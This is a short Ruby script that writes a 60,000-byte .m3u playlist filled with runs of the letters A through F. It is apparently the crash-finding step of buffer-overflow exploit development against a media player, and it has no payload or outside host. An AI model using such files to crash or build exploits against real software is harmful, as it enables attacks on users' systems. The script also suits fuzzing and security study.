#!/usr/bin/env ruby

file = "findcrash.m3u"

junk = "\x41" * 10000
junk2 = "\x42" * 10000
junk3 = "\x43" * 10000
junk4 = "\x44" * 10000
junk5 = "\x45" * 10000
junk6 = "\x46" * 10000
exploit = junk + junk2 + junk3 + junk4 + junk5 + junk6

File.open(file, 'w') {|f| f.write(exploit)}
puts "File #{file} was created"